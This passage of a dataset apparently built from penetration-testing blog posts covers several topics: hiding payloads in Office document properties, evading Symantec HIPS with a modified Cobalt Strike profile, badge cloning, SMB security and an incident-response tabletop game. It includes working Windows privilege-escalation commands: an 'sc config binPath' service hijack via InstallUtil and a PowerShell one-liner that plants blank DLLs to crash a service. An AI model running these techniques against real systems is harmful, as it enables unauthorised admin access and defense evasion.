disposable sleeves how about an RFID blocking wallet? And not just any wallet, but also a stylish wallet! $65+ from The Ridge https://www.ridgewallet.com/ I\u2019m digging this rose gold one (other colors available).\n\nGifts From $100+\nPocket Firewall: https://store.netgate.com/SG-1000.aspx\nIt's 3\" x 2\" x 1\", it comes in red aluminum, and it's got a TI ARM Cortex-A8 AM3352 CPU at 600 MHz, including crypto accelerator which is definitely something you want in your pocket.\nGlyph 1TB SSD external drive. Ethan says, \u201cI love this thing. It's tiny and I can run VMs off of it.\u201d -$400 https://www.amazon.com/Glyph-Atom-USB-C-Compatible-Thunderbolt/dp/B00Z14U406/\nEthan suggests bluetooth headphones. \u201cI have both ear buds and can headphones. It's so nice not to constantly catch the cord on everything.\u201d (Hey, nobody said just because we work in tech we\u2019re early adopters!)\nBose Noise Canceling Headphones - $330\n\nChristmas is a time to give gifts that nobody NEEDS, but everybody wants. These are especially great for the person in your life who travels all the time - so luxurious.\nhttps://www.amazon.com/Bose-QuietComfort-Wireless-Headphones-Cancelling/dp/B01E3SNO1G/\nToo fancy for your blood? Costco has a Sony version for $200, and a generous return policy. (But you probably wont\u2019 be returning) https://www.costco.com/Sony-MDR100ABN-Bluetooth-Noise-Canceling-Headphones.product.100381422.html\n__________________________________________\nThoughts from BB King:\nI'm calling it: 2018 will the the Year of Linux on the Des^w^w^w^w Software Defined Radio. Information is getting easier to find (did you hear about the SDR labs at WWHF?), and new hardware is getting more affordable.\nStart with some study: The Field Expedient SDR books are a great introduction in three small volumes.\nhttp://www.fieldxp.com/home/\nIf you need a first SDR receiver, pick up this RTL-SDR kit for $26. This one is receive-only, but you should spend a lot of time receiving before you transmit anyhow. Don't hose up the spectrum until you know what you're doing.\nhttps://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/\nSkip a night out and spend the savings on this. Then skip more nights out and play with your new toy. You'd rather stay in anyway, right?\nBut here's why it's the year of SDR: the LimeSDR Mini ships on 12/31/2017! The Mini compares favorably with the HackRF One on most (not all) tech specs, and it's only $130 (vs $300 for the HackRF One). It's tiny and promises some capabilities that normally cost a lot more.\nhttps://www.crowdsupply.com/lime-micro/limesdr-mini\n___________________________________________\n \nWell there you have it kids. Stay safe out there on this Cyber Monday! And happy shopping!\nThis is not a sponsored post, and although we probably should get some pennies kicked our way from them, none of those links are affiliated. Cause you know, I may be in marketing but I try not to be too skeezy. You\u2019re welcome and HAPPY HOLIDAYS!!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hide Payload in MS Office Document Properties\"\nTaxonomies: \"Red Team, Red Team Tools, how to hide payload in MS docs, Malware, Microsoft, MS Word, pen-testing, penetration testing, pentest, Pentesting, Pentesting tips and tricks, PowerShell, PowerShell Scripts, Word\"\nCreation Date: \"Wed, 29 Nov 2017 14:40:22 +0000\"\nCarrie Roberts* //\nCan you think of a reason why you might want to put a lengthy comment into the properties of an MS Office document?\n\nIf you can, then you might like this PowerShell script that will put a comment of any length into this field you. Microsoft limits the length of comments that can be inserted when using the application (e.g. Word, Excel, PowerPoint), but this script gets you past that limitation. The animation below shows the script in action.\n\nThe script also includes a \u201cSanitize\u201d option that will clear out the values for the \u201cAuthor\u201d and \u201cLast Modified By\u201d document properties, in case you don\u2019t want to share that information. Or you can use additional command line parameters to set specific values as shown in the demo.\nTo read the comment value out using a Macro, use this for MS Word:\nDim prop As DocumentProperty\n\n For Each prop In ActiveDocument.BuiltInDocumentProperties\n\n    If prop.Name = \"Comments\" Then\n\n        MsgBox prop.Value\n\n    End If\n\n Next\nOr for MS Excel, just change ActiveDocument to ActiveWorkbook:\nDim prop As DocumentProperty\n\n For Each prop In ActiveWorkbook.BuiltinDocumentProperties\n\n    If prop.Name = \"Comments\" Then\n\n        MsgBox prop.Value\n\n    End If\n\n Next \nAnd for PowerPoint? You guessed it:\nDim prop As DocumentProperty\n\n For Each prop In ActivePresentation.BuiltInDocumentProperties\n\n    If prop.Name = \"Comments\" Then\n\n        MsgBox prop.Value\n\n    End If\n\n Next\nMaybe you would like to enter your comment as a base64 encoded string and decode it within the macro. This vbscript code will do the trick.\nI hope that this has been a helpful post and you find the script useful. Until next time . . .\n_______\n*Carrie was previously a BHIS tester until she transferred to another great company. But we're super happy to have her many awesome, informative guest posts!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Morning with Cobalt Strike & Symantec\"\nTaxonomies: \"Author, C2, Joff Thyer, Red Team, anti-virus, AV software, C2, easy button, pen-testing, penetration testing, pentest, Pentesting, Symantec, There is NO easy button\"\nCreation Date: \"Mon, 04 Dec 2017 15:28:39 +0000\"\nJoff Thyer //\n\nIf you have been penetration testing a while, you likely have ended up in a Red Team situation or will be engaged in it soon enough. From a command channel perspective, the work that Raphael Mudge has put into Cobalt Strike makes it an attractive platform for teamwork. Unlike traditional methods of using things like Linux \u201cscreen\u201d with PowerShell Empire, and/or Metasploit, Cobalt Strike allows for the setup of an operational attack infrastructure that further promotes real threat emulation possibilities.\n\nOne of the Black Hills friends in the community (Lee Kagan) contributed an excellent blog post which you can find at https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/ detailing how to go about setting up Cobalt Strike with a threat emulation profile. (Part 2 is forthcoming, he promises.)\n\nAs a part of that post, it includes a link to a shell script that automates a portion of the setup such that the proper Cobalt Strike profile is created. This can be found from @KillSwitch\u2019s GitHub repository https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh.\n\nOn some recent Red Team activities, I leveraged all of the above information with some nice custom domains, and my own unique DNS name server infrastructure all running within virtual machines at Digital Ocean. This allowed me to create an operational infrastructure that could properly provide either DNS, HTTP, or HTTPS command channels via an appropriately \u201cmatured\u201d domain name with full threat emulation of Amazon-like web traffic. All of this using virtual systems with IP addresses not easily attributed back to myself.\n\nI was feeling pretty good about this, and I set out on my adventure to deliver C2 payloads into the customer network. Now, in this case, the customer was actually happy to run some things for me thus removing the social engineering aspect of the test. My natural inclination was to jump towards PowerShell and/or executable content though I did need to be cognizant of endpoint protection solutions.\n\nSome initial attempts at using executable content revealed that Symantec endpoint protection was at play and that certain things would fire a signature on the endpoint. Symantec (and others) have evolved some interesting changes in feature sets over time, some of which are effective, and some not so much. I do maintain a subscription to the non-enterprise consumer version of Symantec so I moved into research mode a while.\n\nIn terms of Symantec endpoint protection features, I mostly encounter the following obstacles during pentesting:\n\nEndpoint/host-based intrusion prevention (HIPS)\n\nSignature-based protection for executable content on disk\n\nSignature-based protection that appears to leverage the application compatibility toolkit (ACT) shim during the process creation pipeline.\n\nMemory-based detection of shellcode.\n\nGiven this knowledge, and the goal of proper threat emulation, I decided to set up three different scenarios with Cobalt Strike for some advance testing of Symantec endpoint protection responses. In these scenarios, I deliberately avoided both DLL/EXE content and any TLS channels. I wanted to focus on the HIPS and memory-based detection functionality of the defenses.\n\nCobalt Strike team server with no custom HTTP/HTTPS profile and a listener on port 80 using HTTP.\n\nCobalt Strike team server with an Amazon web server profile generated by the HTTPSC2DoneRight.sh script and using an HTTP listener.\n\nCobalt Strike team server with a customized version of the Amazon HTTP listener profile.\n\nThe version of the Symantec software I was using for this test is shown in the following screenshots. Yes, it was fully up to date as of today.\n\nAll payloads for the above scenarios were generated as PowerShell commands from Cobalt Strike and pasted into a command shell on a test system. Cobalt Strike has either a 32-bit based shellcode or 64-bit based shellcode which can be generated.\n\n 32-bit payload generates IPS Alert \n\nThe first discovery was that regardless of the server-side listener configuration, the 32-bit payloads would always generate an IPS alert and be blocked before any traffic reached the server. An example alert is shown above.\n\n 64-bit payload results in success! \n\nIn the case of 64-bit payloads, a successful command channel session is established to the Cobalt Strike team server in two of the above use cases:\n\nNo specific/custom profile at all with HTTP listener\n\nHighly customized profile with HTTP listener\n\nThe strangest case was the second scenario in which the HTTPSC2DoneRight.sh script was used to generate the Amazon-like profile. In this case with a 64-bit payload, I observed that the second binary stage of payload was delivered just fine. After that delivery comes to the initial HTTP GET request. The Amazon-like script above generates a GET REQUEST as follows.\n\nGET /s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\n\nWhat is completely bizarre is that the C2 Channel back to Cobalt Strike is NOT ESTABLISHED, but furthermore there is absolutely no output or feedback of malicious activity on the client workstation.\n\nI decided to break out the packet sniffer and noted the payload delivery observation of the second stage, and then saw that connection requests were being immediately torn down with a TCP RESET when the client-side attempted the GET request above.\n\n Four separate retries from the client workstation, each with five-second wait between retrying \n\n Excerpt from the \u201camazon.Profile\u201d file on Cobalt Strike Team Server \n\nSo then I decided to break out the sniffer for the same profile on the team server but on a client system with no Symantec endpoint protection installed.\n\nSure enough, as the below screenshot from Wireshark shows, the traffic went right on through as expected.\n\n Captured C2 Channel GET Request from Non-Symantec Installed System \n\nIt becomes abundantly clear to me that the Symantec HIPS was blocking and resetting the TCP connection whenever the TCP stack attempted to transmit the above GET request, and that this must be a specific signature written to match the scripted Amazon profile.\n\n Ever so slightly modified profile \n\nNaturally, I decided to make a small change on the team server profile which replaced the original sequence of digits in the GET request with all 8\u2019s instead. Note that this is a really minor change that would not even circumvent a well constructed regular expression and/or IPS signature with multiple matching criteria. I changed not a single other parameter for this test. Other parameters that could be dead giveaways included the host header, and certainly some fixed cookie values.\n\nThe result? Yes, you guessed right, one happy C2 session established.\n\n Established C2 Session \n\nIn conclusion, while I think that endpoint protection suites are getting better in general, there is still a lot of work to be done for custom malware activity. In performing this testing work, I surmised that in a Symantec endpoint protection context:\n\n64-bit shellcode delivered into memory with typical injection techniques still has a good chance of success.\n\nThe HIPS functionality does not seem to inspect second stage shellcode delivery at all.\n\nWriting a specific HIPS signature in response to a widely published penetration tester threat modeling technique seems quite arbitrary but moreover is not an effective defense.\n\nNot informing the end-user of potential malicious activity is a \u201cfalse negative\u201d. Frankly, there is nothing worse than not knowing.\n\nThe lesson learned for penetration testers here is to not fall into the trap of trying to press the \u201cEasy Button\u201d. I know we are often in a hurry to get things done, but using canned scripts on the internet will end up getting you blocked in some form or another. This is clearly the case even if the canned script is well-intended threat modeling. Always review, and validate what you are about to do! Happy hunting folks.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Digging Deeper into Vulnerable Windows Services\"\nTaxonomies: \"Author, Brian Fehrman, External/Internal, Red Team, Application Whitelisting, escalated, penetration testing, Pentesting, privilege escalation, whitelisting, Windows, Windows Privilege Escalation\"\nCreation Date: \"Wed, 06 Dec 2017 15:05:10 +0000\"\nBrian Fehrman //\n\nPrivilege escalation is a common goal for threat actors after they have compromised a system. Having elevated permissions can allow for tasks such as: extracting local password-hashes, dumping clear text credentials from memory, and installing persistent back doors on the system. Insecurely-configured Windows Services can be one avenue for privilege escalation. Windows Services typically run under the context of an elevated user. If you can get the service to run your malicious program, your program will likely run with elevated permissions. This blog post discusses two obstacles that might arise when attempting to exploit Windows Services.\n\nLocal Windows Privilege-Escalation via Insecure Service with Application Whitelisting Present\n\nIn this section, we briefly discuss a scenario with the following conditions:\n\nYou have command-line access to a Windows system\n\nYou are an unprivileged user\n\nYou have permissions to overwrite a privileged service\n\nYou either have permissions to stop/restart the vulnerable service mentioned in 3 or you are able to stop it with another method (such as using blank DLL files to crash the service).\n\nYou can restart the system\n\nApplication whitelisting is enabled on the system\n\nIn other words, you\u2019ve run PowerUp or another local-privilege escalation script, you see a service is vulnerable, you can easily overwrite it\u2026but your malicious binary won\u2019t run because application whitelisting (AWS) is preventing it from executing. What to do? Well, we can turn to some of the nifty AWS bypass techniques that have been disclosed by Casey Smith and others. InstallUtil is a great one since the template is fairly small, you can easily customize your program to perform whatever privileged-task you\u2019d like (e.g., add a user and make them local admin, establish a C2 connection as SYSTEM, etc.), C# is fun to write and can be compiled locally, and many other great benefits.\n\nIn this example, we have code that was written to:\n\nCreate a new local user\n\nAdd the new user to the local Administrators group\n\nMake another call to InstallUtil that runs a second, custom C# program that calls out to a remote server and establishes a Meterpreter C2 session\n\nRun via InstallUtil\n\nThe code can be compiled using the csc.exe C# compilation tool that is typically present on Windows systems and is usually trusted by AWS. Let\u2019s say your code is located at C:\\Users\\Public\\runthis.cs, the following command can likely be used to compile the program.\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /platform:anycpu /out:C:\\Users\\Public\\shell.exe C:\\Users\\Public\\runthis.cs\n\nHow do we get this to work with the service though? Easy! If you have written permissions for the service, you likely have permissions to reconfigure certain properties of the service as your normal. Windows Service-Config tool, called sc, can be used to tell the vulnerable service which binary it should run by configuring the service\u2019s binPath property. The binPath property not only points to the binary, but it also allows you to specify command-line arguments just as you would if you called it directly from the command line. Let\u2019s say that the service is named ExploitThisService and your binary is located at C:\\Users\\Public\\shell.exe (as given by the compilation command above), then you could use the following service-config command:\n\nsc config ExploitThisService binPath= \"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe\n\n/logfile=C:\\Users\\Public\\logfile.txt /LogToConsole=false /U C:\\Users\\Public\\shell.exe\"\n\nThat\u2019s it! Restart the computer and voila, your executable should run under the same privileged context that the vulnerable service was running.\n\nLocal Windows Privilege-Escalation via Insecure Service without Stop/Restart Permissions\n\nLet\u2019s consider another scenario that is similar to the first section of this write-up. In this scenario, however, let\u2019s assume that you do not have the ability to stop or restart the service. This missing permission is actually quite common. Without being able to stop the service, you won\u2019t be able to overwrite the executable and may not be able to update the configuration. What do we do in that case? One possibility is to take advantage of the way that programs search for DLLs that they need to load upon execution.\n\nDLL hijacking is nothing new. The concept is that you overwrite a DLL that is required by a program with your own malicious DLL. The program runs, calls your DLL, and your code is executed. That isn\u2019t what we are talking about here though. In this case, we are going to use DLLs to crash the service so that we can overwrite it.\n\nA design decision made by Windows dictates that, by default, programs will first look in their current folder for any necessary DLLs. Hardcore Windows people, please correct me if I am wrong with the following statement: all Windows programs will require at least one DLL from the C:\\Windows\\System32 folder if it is not included with the program. Obviously, that folder path is used in a general sense and I am sure people will troll me on the fact that it can be changed\u2026but you get the idea.\n\nSo how do we take advantage of this? Easy! Have you ever tried to run a program and were greeted with an angry-looking message that said it couldn\u2019t find a required DLL? Probably\u2026What would happen if the program could find the DLL but the DLL was corrupted? Or\u2026if the DLL was just a blank file? *Queue Light Bulb Graphic*\n\nLet\u2019s assume that the vulnerable service is located in the folder C:\\VulnService\\. The following PowerShell one-liner will parse the C:\\Windows\\System32\\ directory, grab the names of all of the DLLs, create blank files with the same names, and place them in C:\\VulnService\\ directory.\n\ndir C:\\Windows\\System32 -filter \u201c*.dll\u201d | select-object Name | foreach-object{ $str = \\\u201dC:\\\\VulnService\\\\\\\u201d + $_.name; New-Item -type file $str }\n\nNow, restart the system and\u2026boom! The service should crash and you should now be able to overwrite it with a malicious binary of your choosing or update the service config to utilize the AWS bypass method mentioned in the previous section. Don\u2019t forget to remove the blank DLLs from the folder before attempting to run your binary or it might end up in the same grave as the vulnerable service.\n\nYou probably noticed that this is a lot of DLLs to copy over and you likely don\u2019t need all of them. You\u2019re right! We are currently narrowing down a list of commonly-required DLLs by running random programs and using DLL inspection tools to determine which DLLs are loaded. There are some lists out there of commonly-used DLLs and we\u2019ve got ours narrowed down to about 15 or so. It will be released once we are satisfied\u2026or we\u2019ve grown bored of running random programs.\n\nWe will point out that we mentioned the DLL search behavior is default; this doesn\u2019t mean it can\u2019t be changed. You can change the DLL search behavior by referring to some of the methods in this article that was released by Microsoft: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Performing a Physical Pentest? Bring This!\"\nTaxonomies: \"Author, Jordan Drysdale, Physical, Red Team, Badgy, Jordan Drysdale, pen-testing, penetration testing, pentest, Pentesting, Physical Pentest\"\nCreation Date: \"Wed, 13 Dec 2017 16:12:04 +0000\"\nJordan Drysdale//\n\nPhysical Pentest Upcoming? Bring a Badgy.\n\nWhile badge reproduction may not be the intended use of this product, if you are a physical tester and you don\u2019t own one, you need to get one.\n\nhttps://www.badgy.com/products/badgy-200.html\n\nWhile stuffing this thing in my suitcase was the obvious choice, maybe in the future I\u2019ll avoid the TSA\u2019s standard loveletter and just ship it.\n\nDuring an onsite and depending on the time constructs, wandering around outside customer facilities can often lead to an information disclosure situation that is rarely protected by steadfast data controls. If you can identify a badge, the next part is easy; duplicate it. This product had no trouble mapping over USB direct to a VM. From there, Evolis Studio allowed us to iterate through badge variations until we were satisfied.\n\nhttps://www.badgy.com/download/evolis-badge-studio.html\n\nThis page requires things, but not attributable things or monetary exchange. While I\u2019m not going to display the front we came up with, here\u2019s the back:\n\nDon\u2019t forget to match the target environment; with these badges and a tie, we were essentially ignored... even with our antennae, Rubber Duckys, Bash Bunnys, and lock picks in full, upright, and locked positions.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Small and Medium Business Security Strategies: Part 1\"\nTaxonomies: \"Author, Blue Team, How-To, Jordan Drysdale, Critical Controls, it security, Jordan Drysdale, Small Business, Small Business Security\"\nCreation Date: \"Wed, 20 Dec 2017 15:30:26 +0000\"\nJordan Drysdale//\n\nBlurb: A few of us have discussed the stress that small and medium business proprietors and operators feel these days. We want to help stress you out even more. Not really, but if you aren\u2019t worrying about IT security, you are probably doing it wrong. This series will run through some of the important controls that IT pros have mapped out for us. We are trying to present these in a way that you can accomplish them without dedicated IT staff.\n\nWe\u2019re all facing a fairly challenging landscape; hackers seemingly making shambles of enterprise network defenses, nation-state actors stealing secrets from each other, and the constant concerns we have about our data privacy. How in the world is a small business expected to defend itself against a nation-state? What about a rogue employee?\n\nMost of us at BHIS have spent time as the front line defenders of networks of various sizes. Defending small networks will boil down to a few steps - really just the first five critical controls to get started. There is a lot of technical lingo and information about the Critical Controls here.\n\nGetting your organization headed in the right direction requires starting a conversation with your staff. Once this conversation is started, you need to keep it going. The human element of IT security is left off the critical controls checklists and should be first. Secure firms understand Information Security and how it pertains to each employee. Each individual feels responsible.\n\nThe five basic controls to get your network to a basic level of security look like this:\n\nHardware Inventory\n\nSoftware Inventory \n\nSecure Configurations   # This may be the most difficult step \n\nVulnerability Assessment and Remediation\n\nLimiting Admin Privilege \n\nThis look is to be expected at this point. You might be asking something along these lines: What are secure configurations? How can I possibly understand \u201cLimited Admin Privilege?\u201d Seriously, what is vulnerability assessment and remediation? We are going to start slow, set realistic goals and will work together to get your network under control.\n\nSo where to from here? No one has time, no one wants extra duties and everyone has to step in and participate. Based on experience, most offices, businesses, schools, et cetera have someone around who knows about computers. This person is usually the go-to resource for broken printers, blue screened workstations and internet outages. This person is an asset and should serve as a guide for this process. They can answer questions and will definitely know what a modem, switch, and router looks like.\n\nNext up in the series: Part Two, inventory. Let\u2019s put together a list of systems, network gear and the people responsible for them.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Holiday Tale of Two Teams: The Blue Team Barbie & Red Team Elf on the Shelf saga\"\nTaxonomies: \"Fun & Games, Blue Team, Blue Team Barbie, Christmas Toys, Elf on the Shelf, fun and games, infosec, Red Team, Red Team Elf on the Shelf\"\nCreation Date: \"Fri, 22 Dec 2017 16:55:00 +0000\"\nStaff // Thanks to everyone for all the good ideas! We had so much fun with this, and hopefully it made you laugh as much as we did.\n\nHappy December! Follow along for some BHIS Christmas Fun with Blue Team Barbie vs. Red Team Elf on the Shelf!\n\nRed Team Elf on the Shelf snuck into his gifts a little early this year. Who knows what mischief will follow...\n\nAfter reading about Mike and Beau's Google calendar exploits Blue Team Barbie implemented Yubikeys for herself and her entire team.\n\nRed Team Elf on the Shelf just won't stop! Looks like Blue Team Barbie has installed NoScript throughout the office, though!\n\nOn the 4th day of Christmas Red Team Elf on the Shelf tried to use... four lock picks, three fake badges, and two cover stories that STILL didn't get past Blue Team Barbie, who takes physical security very seriously.\n\nRed Team Elf on the Shelf decided to take a break and do a little reading over the weekend. It will be an interesting week for Blue Team Barbie, I'm sure!\n\nBlue Team Barbie caught the flu... and is stuck in bed, but she can still read up. Surely her team can handle a day without her... right?\n\nSomeone from Blue Team Barbie's company was kind enough to hold the door for Red Team Elf on the Shelf, and he was in! Timing is everything! Now to sneak away... (He decided it was best to stay incognito, since Blue Team Barbie had already spotted him on the security camera so he fashioned a hacker bandit mask for minimal detection).\n\nRed Team Elf on the Shelf found the server room... This can't be good!\n\nAfter KonBooting he also left behind a dropbox. Which of Blue Team Barbie's active defenses will catch it?\n\nPort based security kept Red Team Elf on the Shelf contained. It looks like that nasty elf used a drop box that sent multiple DNS requests to untrusted hosts. This triggered alerts and sure enough, when Blue Team Barbie was back from sick leave she checked her RITA console and found it had flagged beacon behavior.\n\nBlue Team Barbie always finds time to educate her team about basic best practices through weekly brown bag lunches. This week Blue Team Barbie decided a refresher about good password usage might be useful, which especially important since she suspects their company is under attack.\n\nRed Team Elf on the Shelf has dropped various USB sticks with malware on them in the parking lot, hoping that someone will be curious enough to plug them in. Blue Team Barbie knows the best plan of attack is to destroy them on site!\n\nRed Team Elf on the Shelf has finished the pentest of Blue Team Barbie's company. They did great! After going over the report to show some ways they could stay strong (remind people about tailgating and suspicious looking characters in bandit masks) the company was awarded the coveted Honey Badger Award for excellent security posture!\n\nNow that the pentest is over Blue Team is at home starting her holiday break and Red Team Elf on the Shelf is excited to finally get to play the Holiday Hack challenge. What fun things you going to do over your holiday?\n\nThanks for following Blue Team Barbie and Red Team Elf on the Shelf's holiday shenanigans! Tune in again next December!\n\n "
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Dungeons & Dragons, Meet Cubicles & Compromises\"\nTaxonomies: \"Author, Blue Team, John Strand, Cubicles and Compromises, Dungeons and Dragons, Incident Response, Table Top\"\nCreation Date: \"Thu, 21 Dec 2017 18:33:35 +0000\"\nJohn Strand //\n \n\nLately we've been running a very cool game with a few of our customers. There's been some demand for incident response table top exercises. For the most part, these are not fun events. I've sat through more than a few stuffy meetings where people walk through an incident and then comb through polices, processes, and procedures. Gah!\n\nOften, there are dry arguments about whether or not a procedure is sufficient or if X technology would really work the way it is should. More often than not people get angry and hurt, and very little changes.  When the whole event is over, most involved don't ever want to do it again. It's like slamming your hand in a car door... slightly interesting, but mostly just painful.\n\nWe didn't want to do our table tops this way. (Cause we like to have fun, and not leave customers in tears.) Instead we started incorporating a little bit of randomness into the process with... you guessed it, a 20-sided dice, cause we're cool like that.\n\nThe key is not to make it too complex. I understand there are going to be lots of people who insist there should be super duper complicated rules that require years of practice and memorization to get \"right\".  These people also tend to be the people who love D&D but want to fight for hours over meaningless details instead of moving a narrative forward. Despite appearances, these people are not your friends and should be avoided at all costs.\n\n\"That is not how you roll for Magic Missile!!\"\n\nGrowing up, the best D&D games were the ones where the dungeon master moved the story forward.  They were willing to simplify and bend the rules for the sake of the story. THAT is what we're doing here.\n\nUPDATE: The printable version can be found here:  www.blackhillsinfosec.com/cubicles-compromises-printable/\n\nThe Rules (dead simple)\n\nFor every action your IR team takes you roll the 20-sided dice. If the roll is 11-20, the action is successful. If it is ten or under it fails. Ka-pow.\n\nYou get a +5 modifier if your organization has documented procedures for the action.\n\nYou get a +2 modifier if your organization has someone trained to do that action.\n\nAt random intervals the IT Guru Master (Yes, this role might need a better name) gets to inject a random into the game. (It will help if the IGM has some pen testing experience.) Below are some examples:\n\n-The attacker posts the incident data on Pastebin.-Bobby the intern kills the system you are reviewing.-It was a blackbox pen-test hired by the CEO\u2026 You can sleep well.-Legal takes your only skilled handler into a meeting to explain the incident.-Lead handler\u2019s wife has a baby.-An unrelated DDoS attack breaks out.Feel free to add more.\n\nIf at any point the team tries to take an action and there are no policies or anyone trained, someone should note that as a gap to be addressed.\n\nThat's it.\n\nQuick Run Through\n\nSo, let's take a starting incident and walk through a couple of action rounds.\n\nIT Guru Master (IGM): Monday morning, the fog clears through the assistance of black coffee. You receive an email/ticket from the help desk that a user reported an AV alert pop up. The help desk technician failed to note the name of the malware. What do you do?Tech #1: We would go and review that system to see if there are any strange processes\n\nIGM: Do you have procedures for live systems forensics?Tech #1: No.\n\nIGM: Is anyone trained in live systems forensics?Tech #1: No.\n\nIGM: Please roll.   \n\nTech #1 rolls a 3   \n\nIGM: The action fails. Please note the lack of procedures and training in live systems forensics.\n\nIGM: The AV only caught the stager for the malware, it did not detect the memory injection stage. The malware is running on this workstation. The attacker then attempts to pivot from the infected workstation to another workstation. Does your team have host based firewalls enabled on workstations?\n\nTech #1: We do.\n\nIGM: Do you have the alerts forwarded to a SIEM?\n\nTech #1: We do.\n\nIGM: Are there procedures for reviewing and clearing alerts after they have been resolved? And are team members trained to do this?\n\nTech #1: We do. And, yes.\n\nIGM: Please roll.\n\nThe Tech #1 rolls a 7 (the +5 for the procedures and the +2 for the training takes the roll to a 14).\n\nIGM: You have detected the lateral movement. What is your next action?\n\nTech #1: We would isolate that system.\n\nIGM: Do you have procedures for system isolation?\n\nTech #1: We do and we are trained\n\nIGM: Please roll.\n\nTech #1 rolls a 13.\n\nIGM: You have successfully isolated the system. However, it is now time for an inject. The attacker has posted some sensitive HR data from that system to Pastebin. A customer found it via Google. What is your next step?\n\nTech #1: We would immediately pass this information to management.\n\nIGM: Management, what is your next action?\n\n \nManager #1: We would immediately contact the customer to get additional details and we would contact Pastebin to request the information be removed.\n\nAnd on it goes. The goal is to work through as many incidents as possible to identify gaps in training and procedures.\n\nIf you want an added bit of fun, have the Red Team play the part of the attacker(s). The rules for them are simple, every action they take is a simple over ten roll to be successful. No modifiers. If you think this is mean, you've never been a pentester. This is more than generous.\n\nThe IGM can modify and add rolls for different actions being successful as they see fit. Let's say the attacker dumps passwords. If the company still has LanMan the IGM will require a roll of two or greater to be successful. If the passwords are NT and a minimum of 20+ characters the IGM would require a roll over 18 to crack a password. (That's just one example I like to use.) Please, feel free to change and add however you see fit to make the game more interesting, or applicable to your business.\n\nWe'll schedule a webcast soon where we play a round or two to help everyone get a feel for this. It's much more fun than slamming your hand in the car door.\n\nHappy Holidays!\n\nJohn\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Small and Medium Business Security Strategies: Part 2\"\nTaxonomies: \"Author, How-To, InfoSec 201, Jordan Drysdale, it security, Jordan Drysdale, Small Business, SMB InfoSec Controls\"\nCreation Date: \"Wed, 03 Jan 2018 14:42:09 +0000\"\nJordan Drysdale //\n\nA few of us have discussed the stress that small and medium business proprietors and operators feel these days. We want to help stress you out even more. Not really, but if you aren\u2019t worrying about IT security, you are probably doing it wrong. This series will run through some of the important controls that IT pros have mapped out for us. We are trying to present these in a way that you can accomplish them without dedicated IT staff. \n\nTo start from the beginning of this series: Part 1 - Introduction to SMB InfoSec Controls\n\n Part 2: Inventory \n\nThe first piece of the puzzle is sitting down and understanding at a minimal or conceptual level what it takes to keep your organization\u2019s IT infrastructure operational. Do you have a modem and a phone line? Who do you call if service drops? Finding answers to these questions should help you sleep a little better at night. That said, there are a lot more of these questions specific to inventory controls. \n\nDo you have an off the shelf device from an outlet store connected to your modem? Do you know the password or who configured it? Do you know what a router is? As the proprietor of any business, it is your job to delegate ownership of network inventory to someone you trust if you are not doing it yourself.\n\n Taking Inventory \n\nSpreadsheet Framework for Inventory Management:\n\nThere should be a separate spreadsheet for servers, laptops, and workstations similar to the following:\n\nNow it's time to call a staff meeting. The purpose of this meeting is to help people understand that throughout the calendar year of 2018, the company will be transitioning and everyone is going to play a role. Ask your staff if they have had their identity stolen. Ask them if they are worried about hacking. Some of your employees will answer yes to the first and most to the second.\n\n Delegation \n\nLet\u2019s delegate some tasks. First, find the person with the most knowledge about systems and computers. This person gets to take a crack at the telecommunications area. They need to document the modem, any switches, routers, firewalls, wireless devices, et cetera. Next, each member of your team will need to provide the details of their system to the spreadsheet owner. \n\n Network Configuration \n\nThere are at least a million unique ways to install and configure a small network. There is a very good chance your network may exist outside even these unique configurations. As a previous member of a \u2018managed services\u2019 team, it is very possible that you paid someone else to install, configure, and troubleshoot your network. It is also very possible that these folks are still in charge of your network.\n\nHere\u2019s a very strong case for managed services:\n\nNetworks are complex and hard to manage.\n\nWithout dedicated IT staff, it can be a nightmare to manage yourself. \n\nFor a thousand bucks or so a month, having a dedicated team to answer trouble calls and show up when things are broken, this absolutely crushes the ROI of an FTE. \n\nAssuming you have a dedicated IT FTE, for even mildly complex networks, it is nearly impossible to know everything.\n\nLast, it so much easier to let someone else worry about these things. \n\nLet\u2019s look at the last bullet here: \u201cLet someone else worry about your network.\u201d This in itself is a dream and should be far from reality. Contact your managed services provider now and ask for an inventory of your networking gear. Follow up with a second request for the inventory spreadsheet of your servers, workstations, and laptops. If they don\u2019t provide this in a timely fashion, it likely means they don\u2019t have it. This demonstrates a flaw in their management of your network. \n\nSo, with a couple of spreadsheets and a plan, you too can maintain an accurate inventory of your network hardware. Your staff can help ease the burden and should feel empowered to do so.\n\nThe goal is not to run your business like Amazon runs its warehouses, but maybe someday?\n\nNext up in series, we\u2019ll cover some of the software inventory strategies that can help you finish out the inventory controls from the CSC.\n\n"
    },
    {
        "input": "",
        "instruction": "",
